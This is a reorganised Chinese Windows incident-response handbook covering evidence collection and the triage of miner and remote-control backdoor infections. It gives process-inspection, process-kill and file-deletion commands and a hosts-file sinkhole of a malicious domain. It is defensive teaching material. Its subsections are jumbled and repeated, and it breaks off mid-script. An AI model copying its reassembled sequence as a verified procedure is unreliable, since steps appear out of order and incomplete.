# Windows 应急响应手册（整理版）

> 来源：`https://books.noptrace.com/windows/`
> 说明：根据站点 `search/search_index.json` 公开索引整理；内容已转换为 Markdown，便于检索和对比。

## 目录

1. [封面](https://books.noptrace.com/windows/0.%E5%B0%81%E9%9D%A2/)
2. [简介](https://books.noptrace.com/windows/1.%E7%AE%80%E4%BB%8B/)
3. [更新日记](https://books.noptrace.com/windows/2.%E6%9B%B4%E6%96%B0%E6%97%A5%E8%AE%B0/)
4. [事前准备](https://books.noptrace.com/windows/3.%E4%BA%8B%E5%89%8D%E5%87%86%E5%A4%87/)
5. [挖矿病毒](https://books.noptrace.com/windows/4.%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/)
6. [远控后门](https://books.noptrace.com/windows/5.%E8%BF%9C%E6%8E%A7%E5%90%8E%E9%97%A8/)
7. [勒索病毒](https://books.noptrace.com/windows/6.%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/)
8. [暴力破解](https://books.noptrace.com/windows/7.%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/)
9. [钓鱼事件](https://books.noptrace.com/windows/8.%E9%92%93%E9%B1%BC%E4%BA%8B%E4%BB%B6/)
10. [非持续性事件](https://books.noptrace.com/windows/9.%E9%9D%9E%E6%8C%81%E7%BB%AD%E6%80%A7%E4%BA%8B%E4%BB%B6/)
11. [隧道事件](https://books.noptrace.com/windows/10.%E9%9A%A7%E9%81%93%E4%BA%8B%E4%BB%B6/)
12. [badusb 投毒事件](https://books.noptrace.com/windows/11.badusb%20%E6%8A%95%E6%AF%92%E4%BA%8B%E4%BB%B6/)
13. [MSSQL 事件排查](https://books.noptrace.com/windows/12.MSSQL%20%E4%BA%8B%E4%BB%B6%E6%8E%92%E6%9F%A5/)
14. [善后阶段](https://books.noptrace.com/windows/13.%E5%96%84%E5%90%8E%E9%98%B6%E6%AE%B5/)
15. [常规安全检查](https://books.noptrace.com/windows/14.%E5%B8%B8%E8%A7%84%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5/)
16. [小技巧](https://books.noptrace.com/windows/15.%E5%B0%8F%E6%8A%80%E5%B7%A7/)
17. [知识点附录](https://books.noptrace.com/windows/16.%E7%9F%A5%E8%AF%86%E7%82%B9%E9%99%84%E5%BD%95/)
18. [常见问题的解决方法](https://books.noptrace.com/windows/17.%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/)

## 1. 封面

> 原文：https://books.noptrace.com/windows/0.%E5%B0%81%E9%9D%A2/

## 2. 简介

> 原文：https://books.noptrace.com/windows/1.%E7%AE%80%E4%BB%8B/

大家好，我们是 NOP Team, 《Windows 应急响应手册》终于和大家见面了！

这是一本 `Windows` 应急响应参考书籍，主要内容包括 `Windows` 中常见应急响应事件的解决方案、应对几十种常见权限维持手段的常规安全检查方法、应急响应过程中的知识点以及小技巧

`Windows` 是一个闭源的操作系统，粗俗一点说就是一个大黑盒子，这给想要研究 `Windows` 安全的攻击与防守研究员都带来了麻烦，然而在攻击与防御对抗中，攻击者往往因为利益和兴趣驱使，通过进程追踪、逆向分析等方式率先获取到攻击和权限持久化的方式；防御者对于这些知识的挖掘似乎力度远不如攻击者，可能是挖掘这类知识首先需要以攻击者的思维去想问题，挖掘出了方式方法后收益也远不如攻击者那么大

从网络上发布的防御者视角的文章来看，普遍无法兼具广和深两个维度，而且思维较为固化，尤其是涉及到思考新思路并需要做实验探究的部分，总是感觉用力不够，缺少对于两个问题的探究： "为什么？" 和 "怎么办？"

这对攻防对抗影响很大，防御侧的情况就和木桶效应一样，尤其是在已经被攻破的系统中，排查持久化控制程序如同大海捞针，这本应急响应手册的意义是希望能够有效发现木桶的短板，给予应急响应人员一个较为明确的指导思想，同时给出经过实践测试的操作方法，保证受害系统经过了一次相对全面的排查，以避免由于应急响应人员知识广度和能力水平问题而造成的二次木桶效应

本书的封面是我和多位设计师不断讨论了近一个月后的最终方案，主要是想致敬我的大学 —— 哈尔滨理工大学，那里有一群热爱网络安全的老师和同学们，他们曾给我很多帮助； 还要致敬我的家乡 —— 黑龙江，北国好风光，尽在黑龙江，欢迎大家去玩～

最后欢迎大家关注我们的公众号，也欢迎大家加我微信进行交流反馈： `just_hack_for_fun`

## 3. 更新日记

> 原文：https://books.noptrace.com/windows/2.%E6%9B%B4%E6%96%B0%E6%97%A5%E8%AE%B0/

v1.3 - 20250718

 - 修复手册引用内容复制乱码、搜索不到的问题
 - 为手册添加了目录
 - 各个应急事件处置流程添加了流程图
 - 各个应急事件处置流程添加了固定证据部分
 - 添加 pathext 环境变量排查
 - 添加 Windows 平台路径存在空格可能带来的劫持排查
 - 添加 NTFS 备用数据流(ADS)检查
 - 添加 Windows Sandbox 检查
 - 完善近期活动部分内容
 - 完善杀毒软件排查部分注意事项
 - 修复了部分注册表错误
 - 删除部分失效链接
 - 完善善后部分
 - 修复部分文字错误

 v1.2 - 20240710

v1.1 - 20240307

v1.0 - 20240203

## 4. 事前准备

> 原文：https://books.noptrace.com/windows/3.%E4%BA%8B%E5%89%8D%E5%87%86%E5%A4%87/

### 0x01 操作系统基本配置

### 0x02 工具准备

- 写保护 U 盘
 - 数据盘
 - 启动 U 盘
 - Windows Server 系列虚拟机或镜像
 - 建议同时准备 32 位工具，以应对 32 位操作系统
 - 本手册，顺便也可以带上 《Linux 应急响应手册》

### 1. 开启显示隐藏文件和文件后缀

- Windows Server 2016

 文件资源管理器 => 查看 => 勾选文件扩展名，隐藏的项目

 - Windows 10

 文件夹（文件资源管理器）=>查看=>勾选文件扩展名，隐藏的项目

 - Windows 7

 文件夹=>工具=>文件夹选项=>查看=>勾选显示隐藏的文件=>取消勾选隐藏已知文件类型的扩展名

### 1. 排查工具

- System Informer

 - OpenArk

 - 火绒剑

 - D盾

 - Sysinternals Suite

 - Windows 调试工具集

 https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/debugger-download-tools

 - 编程语言解析环境

如果你的检查工具依赖于解释器，自行准备好，尽量避免使用受害主机上的环境

 - 一套基本功能的小工具，类似于 `busybox`

 - 日志分析工具 (例如 FullEventLogView)

 - LastActivityView 最近活动记录查看器

 - Netsh (系统自带) 流量监控工具

 - Wireshark 流量分析工具

### 2. 杀毒工具

- 360
 - 火绒
 - 腾讯安全管家
 - webshell 查杀工具
 - D盾
 - 安全狗
 - 深信服-僵尸网络查杀工具

### 3. 漏洞验证工具

- Fscan
 - Goby
 - Nuclei

### 4. 编解码与文本对比工具

编解码&文本对比

 - He3

### 5. 内网文件传输工具

- Localsend

### 6. 日常使用小工具

- Everything
 - bandzip 或 360 压缩
 - Edge 或 Chrome 浏览器
 - 代码编辑器
 - VSCode
 - Sublime
 - Editplus

### 7. 取证工具

- NOPTrace-Collector
 - DumpIt

## 5. 挖矿病毒

> 原文：https://books.noptrace.com/windows/4.%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/

### 0x00 固定证据

在发生任何安全事件时，确定安全事件真实存在以后，第一步都建议固定证据，固定证据一般有以下几种类型，受害单位可以根据实际需求选择

 - 系统快照 - 一般云环境比较方便这么做
 - 磁盘取证
 - 针对性取证 - 例如日志文件、网络信息、数据库等
 - 内存取证

### 0x01 确定 ioc 信息

`ioc` 主要以域名、IP地址、文件md5 为主，通过内网dns服务器、dns防火墙、流量审计设备、主机安全等设备获取

根据`ioc`信息确定挖矿程序具体家族类型

 - Virustotal
 - 深信服威胁情报中心
 - 微步在线
 - venuseye
 - 安恒威胁情报中心
 - 360威胁情报中心
 - 绿盟威胁情报中心
 - AlienVault
 - RedQueen安全智能服务平台
 - IBM X-Force Exchange
 - ThreatMiner
 - 腾讯威胁情报中心
 - 安天威胁情报中心

### 0x02 获取异常进程的 pid

### 0x03 寻找恶意样本

经过以上步骤，已经确定了恶意进程的 pid, 接下来我们通过 pid 找到恶意文件位置以及恶意文件启动时的参数

部分程序可能是通过 powershell 远程加载等方式实现无文件挖矿，此时需要根据实际情况进行分析

### 0x04 确定进程启动时间

这一步骤的主要意义在于对比进程启动时间与恶意文件的相关时间，确定在进程启动后，该文件是否修改过。

根据上述信息简单判断一下启动该异常进程的文件是否为我们找到的文件

### 0x05 处理异常进程

### 0x06 删除恶意文件

### 0x07 善后阶段

直接查看善后阶段即可，主要为定损以及针对性排查处理，目的是解决潜在的受害服务器

### 0x08 常规安全检查阶段

直接根据常规安全检查章节进行安全检查即可，目的是找出当前系统中存在的隐藏后门等

### 1) 任务管理器

`Ctrl+Shift+Esc` 或图形化在下边栏右键，打开任务管理器，点击详细信息标签

可以通过点击 `CPU` 标题列来按照 `CPU` 占用降序排序，这样就可以获取到异常进程的 `pid` 了

### 1. CPU占用

### 1. Powershell

`# 代码版
$maliciousPid = <恶意进程的PID>
$process = Get-Process -Id $maliciousPid
$startTime = $process.StartTime
Write-Host "进程启动时间：" -NoNewline
Write-Host $startTime

```
 `# 压缩成一条命令
$maliciousPid=<恶意进程的PID>; $startTime=(Get-Process -Id $maliciousPid).StartTime; Write-Host "进程启动时间：" -NoNewline; Write-Host $startTime

```

### 1) 任务管理器

点击内存标题列，降序排序

### 1) 资源监视器

任务管理器 -> 性能 -> 点击下方`打开资源管理器` 或可以通过搜索 `resmon` 启动

点击网络标签

在这里可以看到网络占用较高的进程，也可以通过点击列标题进行排序

### 1. 任务管理器

任务管理器默认情况显示的列里没有文件位置以及启动参数，可以通过调整显示列来显示

勾选`路径名称` 和 `命令行`

至于其他与任务管理器类似的程序也是一样的逻辑

### 1. 恶意文件样本采样

在 Windows 上这个就简单多了，可以直接通过网络或者 `U` 盘等介质进行取样

### 1) 暂停进程

【资源监视器】

进程暂停后，`ping` 的动作随即暂停

进程处于暂停状态时，可以恢复进程执行，也可以直接结束掉进程或进程树，我们尝试恢复

被暂停掉的进程继续执行，暂停和恢复前 `pid` 不会发生变化

通过暂停以及恢复，我们基本可以确定要被处理的进程是否为该进程，当然，如果有必要的话才这么做

【`PsSuspend`】

https://learn.microsoft.com/zh-cn/sysinternals/downloads/pssuspend

https://download.sysinternals.com/files/PSTools.zip

暂停进程

 `pssuspend.exe <进程id>

```

恢复进程

 `pssuspend.exe -r <进程id>

```

其他图形化工具基本上都是右键，点击选择就可以了

### 1. 确定文件占用情况

图形化工具中可以直接通过搜索框进行搜索关键字

更好方式是通过搜索文件句柄

`handle` 程序

https://download.sysinternals.com/files/SysinternalsSuite.zip

这是Sysinternals Suite中的一个方便的命令行实用程序，可显示哪些文件由哪些进程打开等

可以通过下面的链接单独下载 handle

https://download.sysinternals.com/files/Handle.zip

若发现存在其他进程占用恶意文件，可能也是恶意进程，可以考虑按照之前的方法处理

### 2. 内存占用

### 2)  Powershell

`Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 5 ProcessName, Id, CPU

```
 这里列出了 `cpu` 占用前 5 的进程以及 `pid` ，但是不是很直观显示占用率

### 2) Powershell

`Get-Process | Sort-Object -Property WorkingSet -Descending | Select-Object -Property Id, ProcessName, WorkingSet -First 5

```

### 2. Powershell

将以下内容保存为 `Powershell` 脚本 `file.ps1` ，之后在 `Powershell` 终端中执行就可以了

 `$maliciousPid = <恶意进程的PID>
$process = Get-WmiObject -Class Win32_Process -Filter "ProcessId = $maliciousPid"
$processName = $process.Name
$processPath = $process.ExecutablePath
$commandLine = $process.CommandLine

Write-Host "进程名称：" -NoNewline -ForegroundColor Green
Write-Host $processName
Write-Host "进程文件位置：" -NoNewline -ForegroundColor Green
Write-Host $processPath
Write-Host "命令行参数：" -NoNewline -ForegroundColor Green
Write-Host $commandLine

```

当然，也可以变成一行

 `$maliciousPid=<恶意进程的PID>; $process=Get-WmiObject -Class Win32_Process -Filter "ProcessId = $maliciousPid"; $processName=$process.Name; $processPath=$process.ExecutablePath; $commandLine=$process.CommandLine; Write-Host "进程名称：" -NoNewline -ForegroundColor Green; Write-Host $processName; Write-Host "进程文件位置：" -NoNewline -ForegroundColor Green; Write-Host $processPath; Write-Host "命令行参数：" -NoNewline -ForegroundColor Green; Write-Host $commandLine

```

### 2) Process Hacker

https://processhacker.sourceforge.io/

标题栏右键，选择显示的栏

根据实际需要，找到添加显示的栏，这里以 `Network total rate` 为例

按照  `Network total rate`  降序排列，就可以找到流量占用较大的进程 `pid`

### 2. wmic

`wmic process where ProcessId=<进程PID> get ProcessId, CreationDate

```
 `wmic` 的显示格式不是很友好，但是依旧可读，而且更详细

### 2. 威胁分析

既然有了恶意样本，可以通过人工或在线平台进行分析

 - 微步云沙箱
 - Virustotal
 - virscan
 - 哈勃
 - jotti
 - scanvir
 - 魔盾
 - HYBRID
 - 奇安信情报沙箱
 - 大圣云沙箱检测系统
 - YOMI
 - 360沙箱云
 - 安恒云沙箱

### 2) 杀死进程

【`taskkill`】

 `taskkill /F /PID <进程ID>

```

【`Powershell`】

 `Stop-Process -Id <进程ID> -Force

```

【`wmic`】

 `wmic process where ProcessId=<进程ID> call Terminate

```

【`pskill`】

https://download.sysinternals.com/files/PSTools.zip

 `pskill64.exe <进程ID>

```

【资源监视器】

其他图形化工具也是类似的使用方法

### 2. 查询注册表

部分恶意程序可能对注册表进行了修改，内容包含恶意程序的名字，这里需要在注册表中搜索一下

`Win + r` 打开运行框，输入 `regedit`，回车

这样就可以进行全局搜索了

即使搜索到了，也不要着急删除或修改，跟各方确定好，这很重要

### 3. 网络占用

### 3) Process Explorer

https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer

https://download.sysinternals.com/files/ProcessExplorer.zip

这个工具现在已经是微软官方的工具，界面看起来和任务管理器差不多，实质上它还有一个功能，就是替换系统的任务管理器

### 3) Process Explorer

https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer

https://download.sysinternals.com/files/ProcessExplorer.zip

通过点击 `Working Set` 降序排序获取内存占用较高的进程 `pid`

### 3. Process Explorer

当然还是可以通过右键属性的方式查看

### 3) System Informer

应该是 `process hacker` 开发者的新项目，支持多种 `cpu` 架构

https://systeminformer.sourceforge.io/

在标题栏右键，点击 `Choose columns...`

这里可以通过搜索`network` 可以快速筛选出与网络相关的栏，这里就是按照实际需求选择了，这里以总的网络速度为例 (`Network total rate`)

这里按照选择的栏进行降序排序就好

### 3. wmic

`wmic process where ProcessId=<恶意进程的PID> get Name, ExecutablePath, CommandLine /format:list

```

### 3. 寻找病毒分析报告

- 深信服EDR团队安全情报分析
 - 火绒安全最新资讯
 - 安全客
 - Freebuf
 - 微步在线 X 情报社区
 - 安天
 - ...

### 3) 杀死进程树

如果恶意进程所在的整个进程树都是恶意的，那就需要杀死整个进程树，在某个进程上杀死进程树就是杀死由该进程起的所有子孙进程

杀死进程已经是危险操作了，杀死进程树更要谨慎

查看进程树

这件事自带的工具并不直观，需要借助第三方工具

【`Process Explorer`】

可以看到， `PING.EXE` 进程的父进程为 `cmd.exe` `pid`为 `3252` , 再上一层父进程为 `explorer.exe` `pid`为 `3140`

如果此时在 `PING.EXE` 上右键，杀死进程和杀死进程树是没有大区别的，因为 `PING.EXE` 并没有子进程，但是如果在上一层 `cmd.exe` 上杀死进程树，那么 `cmd.exe (pid: 3252)` 以及其子进程 `conhost.exe` 和 `PING.exe` 也会被杀死

尝试在 `PING.EXE` 右键杀死进程树

可以看到，其实只有 `PING.EXE (pid: 6656)` 自己被杀死了

我们再启动 `PING.EXE` ，尝试在 `conhost.exe (pid: 5240)` 进程右键杀死进程树

虽然 `cmd` 的黑框框消失了，但是 `PING.EXE` 还在继续运行,如果仅在 `cmd.exe (pid: 5272)` 上右键，仅杀死进程

`PING.EXE` 进程还是会继续运行下去

接下来尝试"赶尽杀绝"

尝试重新起一个 `cmd` 并且执行 `PING.EXE` ，在 `cmd` 进程上右键杀死进程组

这回由该`cmd.exe (pid: 5500)` 其的进程以及子进程都被杀死了

【`Process Hacker`】

`Process Hacker` 以进程树形式显示的话，没有找到相关选项，可能默认就是吧，如果你的不是，可以通过以下方法实现

点击 `Name` 标题栏三次，其实就是我们之前排序，第三次正好是取消排序，之后就会以进程树的形式显示

剩下的使用方法和 `Process Explorer` 一样了

【`System Informer`】

基本与 `Process Hacker` 一样

这里需要提一点，可以看到，在 `PING.EXE` 上右键时，结束进程树的按钮是灰色的，这些小细节应该就是 `System Informer` 与 `Process Hacker` 相比进步的地方吧，所以现在比较建议用新工具，当然前提是你测试过没有蓝屏这种严重 `bug`

### 3. 删除恶意文件

直接图形化删除或者通过下面的命令

 `# cmd
del xxx

```
 `# Powershell
Remove-Item -Path xxx

```

### 4. 内存搜索关键字

将已获取的域名、IP等作为关键字，使用僵尸网络查杀工具在内存中进行搜索

成功发现恶意程序

具体使用方法见 小技巧 -> 0x03 内存中搜索字符串

### 4. Process Explorer

当然，在 `Process Explorer` 中还可以在选中异常进程后，右键 `Properties` 看该进程的详细信息

### 4) Process Hacker

https://processhacker.sourceforge.io/

看起来和`process explorer` 看起来差不多，功能选项也差不多，功能项数似乎少一些，也是通过点击就可以看到进程 `CPU` 占用信息

### 4) Process Hacker

https://processhacker.sourceforge.io/

通过点击 `Private bytes` 降序排序获取内存占用较高的进程 `pid`

### 4. Process Hacker

### 4. 进程查杀

我们不仅可以杀死进程及进程树，还可以让进程暂停(`suspend`)或者进程重启

进程查杀是一个危险操作，所以可以考虑先暂停，看看是否符合预期，再决定是否杀死进程

需要注意的是，即使暂停了进程，该进程的网络连接不见得会断，一般情况下无法发送和接收数据

### 4) 杀死线程

这是一个更加危险的操作，可能对操作系统的稳定性产生影响，尤其是在你手抖的时候

【`System Informer`】

通过右键 -> 属性(`Properties`) -> `Threads` 就可以看到该进程具体的线程信息了

在线程上右键就可以选择 `Terminate` 来杀死线程

可以看到，杀死 `PING.exe` 进程中的一个线程后， 原本的 `ping` 命令卡死了，不再输出 `ping` 命令的信息，但是并没有退出（结束进程），进程依旧活着，而且剩余两个线程也没有退出

过了几秒

整个进程死掉了

`Process Explorer`会提示下载一个其他程序，但是不下载也能显示，`System informer` 没有这个提示

### 5. Process Hacker

也可以通过右键的方式来查看

### 5) System Informer

应该是 `process hacker` 开发者的新项目，支持多种 `cpu` 架构

https://systeminformer.sourceforge.io/

这个项目还在不断更新，可以考虑使用

### 5) System Informer

应该是 `process hacker` 开发者的新项目，支持多种 `cpu` 架构

https://systeminformer.sourceforge.io/

使用方法与 `process hacker` 基本一致

### 5. System Informer

### 6. OpenArk

### 6. System Informer

也可以通过右键进行查看

### 7. 获取异常文件的时间信息

文件浏览器

`Process Explorer`

### 7. OpenArk

https://openark.blackint3.com/

https://github.com/BlackINT3/OpenArk

OpenArk 也是一款集成性的安全排查工具，用于对抗 `Rootkit`

可以查看属性

### 系统快照

这种主要是云环境或虚拟化环境比较方便，目前似乎这类方式取证出来的内容都会丢失内存信息，属于是关机-快照-导出

虚拟机软件似乎支持例如暂停、冻结等功能，具体根据实际情况决定

### 磁盘取证

磁盘取证有很多工具可以考虑

 - `dd`
 - `FTK Imager`

### 针对性取证

这部分推荐我们自己的 NOPTrace-Collector

https://github.com/Just-Hack-For-Fun/NOPTrace-Collector

我们还推出了一套数字取证和应急响应规范，可以根据此规范自己开发取证程序

https://github.com/Just-Hack-For-Fun/OpenForensicRules

### 内存取证

- `DumpIt`
 - `FTK Imager`

 取证后，对证据进行分析时，需要先单独复制一份，保持所有安全人员分析的基础是相同的

## 6. 远控后门

> 原文：https://books.noptrace.com/windows/5.%E8%BF%9C%E6%8E%A7%E5%90%8E%E9%97%A8/

### 0x00 固定证据

在发生任何安全事件时，确定安全事件真实存在以后，第一步都建议固定证据，固定证据一般有以下几种类型，受害单位可以根据实际需求选择

 - 系统快照 - 一般云环境比较方便这么做
 - 磁盘取证
 - 针对性取证 - 例如日志文件、网络信息、数据库等
 - 内存取证

### 0x01 确定 ioc 信息

远控后门一般不会由服务器 CPU 或内存等占用过高告警而发现，大多数情况都是安全设备告警，可能是流量设备，可能是主机安全设备

流量设备告警通常可以得到的信息如下

 - 异常域名
 - 外连`IP`
 - 外联端口
 - 事件时间

 主机安全设备告警通常可以得到的信息如下

 - 恶意文件位置
 - 恶意文件动作

### 0x02 主机安全：直接定位文件

主机安全程序的详细描述信息十分重要，至少可以知道本次是否执行成功，不过即使执行失败，我们还是需要尝试根据文件位置查找进程

图形化工具中可以直接通过搜索框进行搜索关键字

更好方式是通过搜索文件句柄

`handle` 程序

https://download.sysinternals.com/files/SysinternalsSuite.zip

这是Sysinternals Suite中的一个方便的命令行实用程序，可显示哪些文件由哪些进程打开等

可以通过下面的链接单独下载 handle

https://download.sysinternals.com/files/Handle.zip

通过查询文件占用情况，如果发现存在异常进程，可以获取到进程的 `pid`

### 0x03 流量检测： 域名、IP、端口

如果域名没有采用 `cdn` 或者有稳定的 `ip` ，很好办了

### 0x04 寻找恶意样本

经过以上步骤，已经确定了恶意进程的 pid, 接下来我们通过 pid 找到恶意文件位置以及恶意文件启动时的参数

### 0x05 确定进程启动时间

这一步骤的主要意义在于对比进程启动时间与恶意文件的相关时间，确定在进程启动后，该文件是否修改过。

根据上述信息简单判断一下启动该异常进程的文件是否为我们找到的文件

### 0x06 处理异常进程

### 0x07 删除恶意文件

### 0x08 善后阶段

直接查看善后阶段即可，主要为定损以及针对性排查处理，目的是解决潜在的受害服务器

### 0x09 常规安全检查阶段

直接根据常规安全检查章节进行安全检查即可，目的是找出当前系统中存在的隐藏后门等

### 1. 任务管理器

任务管理器默认情况显示的列里没有文件位置以及启动参数，可以通过调整显示列来显示

勾选`路径名称` 和 `命令行`

至于其他与任务管理器类似的程序也是一样的逻辑

### 1) cmd

`ipconfig /displaydns

```

### 1. netstat

`netstat -ano | findstr "ip/端口"

```
 `netstat` 这个命令结果和标题栏对应关系没有 `Sysinternals Suite` 中其他工具那么好，但是还是能看出 `pid` 的位置

### 1. Powershell

`# 代码版
$maliciousPid = <恶意进程的PID>
$process = Get-Process -Id $maliciousPid
$startTime = $process.StartTime
Write-Host "进程启动时间：" -NoNewline
Write-Host $startTime

```
 `# 压缩成一条命令
$maliciousPid=<恶意进程的PID>; $startTime=(Get-Process -Id $maliciousPid).StartTime; Write-Host "进程启动时间：" -NoNewline; Write-Host $startTime

```

### 1. 恶意文件样本采样

在 Windows 上这个就简单多了，可以直接通过网络或者 `U` 盘等介质进行取样

### 1) 暂停进程

【资源监视器】

进程暂停后，`ping` 的动作随即暂停

进程处于暂停状态时，可以恢复进程执行，也可以直接结束掉进程或进程树，我们尝试恢复

被暂停掉的进程继续执行，暂停和恢复前 `pid` 不会发生变化

通过暂停以及恢复，我们基本可以确定要被处理的进程是否为该进程，当然，如果有必要的话才这么做

【`PsSuspend`】

https://learn.microsoft.com/zh-cn/sysinternals/downloads/pssuspend

https://download.sysinternals.com/files/PSTools.zip

暂停进程

 `pssuspend.exe <进程id>

```

恢复进程

 `pssuspend.exe -r <进程id>

```

其他图形化工具基本上都是右键，点击选择就可以了

### 1. 确定文件占用情况

图形化工具中可以直接通过搜索框进行搜索关键字

更好方式是通过搜索文件句柄

`handle` 程序

https://download.sysinternals.com/files/SysinternalsSuite.zip

这是Sysinternals Suite中的一个方便的命令行实用程序，可显示哪些文件由哪些进程打开等

可以通过下面的链接单独下载 handle

https://download.sysinternals.com/files/Handle.zip

若发现存在其他进程占用恶意文件，可能也是恶意进程，可以考虑按照之前的方法处理

### 2. 威胁分析

既然有了恶意样本，可以通过人工或在线平台进行分析

 - 微步云沙箱
 - Virustotal
 - virscan
 - 哈勃
 - jotti
 - scanvir
 - 魔盾
 - HYBRID
 - 奇安信情报沙箱
 - 大圣云沙箱检测系统
 - YOMI
 - 360沙箱云
 - 安恒云沙箱

### 2. Powershell

`Get-NetTCPConnection
Get-NetUDPEndpoint

```

### 2) Powershell

`Get-DnsClientCache

```

### 2. Powershell

将以下内容保存为 `Powershell` 脚本 `file.ps1` ，之后在 `Powershell` 终端中执行就可以了

 `$maliciousPid = <恶意进程的PID>
$process = Get-WmiObject -Class Win32_Process -Filter "ProcessId = $maliciousPid"
$processName = $process.Name
$processPath = $process.ExecutablePath
$commandLine = $process.CommandLine

Write-Host "进程名称：" -NoNewline -ForegroundColor Green
Write-Host $processName
Write-Host "进程文件位置：" -NoNewline -ForegroundColor Green
Write-Host $processPath
Write-Host "命令行参数：" -NoNewline -ForegroundColor Green
Write-Host $commandLine

```

当然，也可以变成一行

 `$maliciousPid=<恶意进程的PID>; $process=Get-WmiObject -Class Win32_Process -Filter "ProcessId = $maliciousPid"; $processName=$process.Name; $processPath=$process.ExecutablePath; $commandLine=$process.CommandLine; Write-Host "进程名称：" -NoNewline -ForegroundColor Green; Write-Host $processName; Write-Host "进程文件位置：" -NoNewline -ForegroundColor Green; Write-Host $processPath; Write-Host "命令行参数：" -NoNewline -ForegroundColor Green; Write-Host $commandLine

```

### 2. wmic

`wmic process where ProcessId=<进程PID> get ProcessId, CreationDate

```
 `wmic` 的显示格式不是很友好，但是依旧可读，而且更详细

### 2) 杀死进程

【`taskkill`】

 `taskkill /F /PID <进程ID>

```

【`Powershell`】

 `Stop-Process -Id <进程ID> -Force

```

【`wmic`】

 `wmic process where ProcessId=<进程ID> call Terminate

```

【`pskill`】

https://download.sysinternals.com/files/PSTools.zip

 `pskill64.exe <进程ID>

```

【资源监视器】

其他图形化工具也是类似的使用方法

### 2. 查询注册表

部分恶意程序可能对注册表进行了修改，内容包含恶意程序的名字，这里需要在注册表中搜索一下

`Win + r` 打开运行框，输入 `regedit`，回车

这样就可以进行全局搜索了

即使搜索到了，也不要着急删除或修改，跟各方确定好，这很重要

### 3. 图形化工具

如果域名采用了 `cdn` ，且端口号比较大众化，可以考虑 `DNS`缓存和诱骗的方式

### 3. Process Explorer

当然还是可以通过右键属性的方式查看

### 3) wmic

`wmic path Win32_PerfFormattedData_DNS_DNSCache get *

```

### 3. wmic

`wmic process where ProcessId=<恶意进程的PID> get Name, ExecutablePath, CommandLine /format:list

```

### 3. 寻找病毒分析报告

- 深信服EDR团队安全情报分析
 - 火绒安全最新资讯
 - 安全客
 - Freebuf
 - 微步在线 X 情报社区
 - 安天
 - ...

### 3) 杀死进程树

如果恶意进程所在的整个进程树都是恶意的，那就需要杀死整个进程树，在某个进程上杀死进程树就是杀死由该进程起的所有子孙进程

杀死进程已经是危险操作了，杀死进程树更要谨慎

查看进程树

这件事自带的工具并不直观，需要借助第三方工具

【`Process Explorer`】

可以看到， `PING.EXE` 进程的父进程为 `cmd.exe` `pid`为 `3252` , 再上一层父进程为 `explorer.exe` `pid`为 `3140`

如果此时在 `PING.EXE` 上右键，杀死进程和杀死进程树是没有大区别的，因为 `PING.EXE` 并没有子进程，但是如果在上一层 `cmd.exe` 上杀死进程树，那么 `cmd.exe (pid: 3252)` 以及其子进程 `conhost.exe` 和 `PING.exe` 也会被杀死

尝试在 `PING.EXE` 右键杀死进程树

可以看到，其实只有 `PING.EXE (pid: 6656)` 自己被杀死了

我们再启动 `PING.EXE` ，尝试在 `conhost.exe (pid: 5240)` 进程右键杀死进程树

虽然 `cmd` 的黑框框消失了，但是 `PING.EXE` 还在继续运行,如果仅在 `cmd.exe (pid: 5272)` 上右键，仅杀死进程

`PING.EXE` 进程还是会继续运行下去

接下来尝试"赶尽杀绝"

尝试重新起一个 `cmd` 并且执行 `PING.EXE` ，在 `cmd` 进程上右键杀死进程组

这回由该`cmd.exe (pid: 5500)` 其的进程以及子进程都被杀死了

【`Process Hacker`】

`Process Hacker` 以进程树形式显示的话，没有找到相关选项，可能默认就是吧，如果你的不是，可以通过以下方法实现

点击 `Name` 标题栏三次，其实就是我们之前排序，第三次正好是取消排序，之后就会以进程树的形式显示

剩下的使用方法和 `Process Explorer` 一样了

【`System Informer`】

基本与 `Process Hacker` 一样

这里需要提一点，可以看到，在 `PING.EXE` 上右键时，结束进程树的按钮是灰色的，这些小细节应该就是 `System Informer` 与 `Process Hacker` 相比进步的地方吧，所以现在比较建议用新工具，当然前提是你测试过没有蓝屏这种严重 `bug`

### 3. 删除恶意文件

直接图形化删除或者通过下面的命令

 `# cmd
del xxx

```
 `# Powershell
Remove-Item -Path xxx

```

### 4. 进程查杀

我们不仅可以杀死进程及进程树，还可以让进程暂停(`suspend`)或者进程重启

进程查杀是一个危险操作，所以可以考虑先暂停，看看是否符合预期，再决定是否杀死进程

需要注意的是，即使暂停了进程，该进程的网络连接不见得会断，一般情况下无法发送和接收数据

### 4. DNS 缓存

### 4. Process Explorer

当然，在 `Process Explorer` 中还可以在选中异常进程后，右键 `Properties` 看该进程的详细信息

### 4. Process Hacker

### 4) 杀死线程

这是一个更加危险的操作，可能对操作系统的稳定性产生影响，尤其是在你手抖的时候

【`System Informer`】

通过右键 -> 属性(`Properties`) -> `Threads` 就可以看到该进程具体的线程信息了

在线程上右键就可以选择 `Terminate` 来杀死线程

可以看到，杀死 `PING.exe` 进程中的一个线程后， 原本的 `ping` 命令卡死了，不再输出 `ping` 命令的信息，但是并没有退出（结束进程），进程依旧活着，而且剩余两个线程也没有退出

过了几秒

整个进程死掉了

`Process Explorer`会提示下载一个其他程序，但是不下载也能显示，`System informer` 没有这个提示

### 5. 地址诱骗

- 找一个内网或公网固定IP主机（诱捕主机），监听恶意域名采用对应的端口
 - 在受害主机上监控受害主机与我们的诱捕主机之间网络连接，若有链接，记录进程id、文件位置等信息
 - 通过修改 `host` 文件，将恶意域名解析到我们的诱捕主机上
 - 等待受害主机上的监控返回结果

 这种方法可以有效解决域名采用了 `cdn` 找不到IP以及进程的问题

修改 `host` 文件方式如下

以恶意域名 `du.testjj.com` 为例

通过修改 `C:\Windows\System32\drivers\etc\hosts` 将 `du.testjj.com` 解析IP修改为 `123.123.123.123`

直接修改 `hosts` 无法保存，可以先保存到桌面，之后拖进去覆盖原来的 `hosts` 文件

监控脚本如下

 `@echo off

:loop
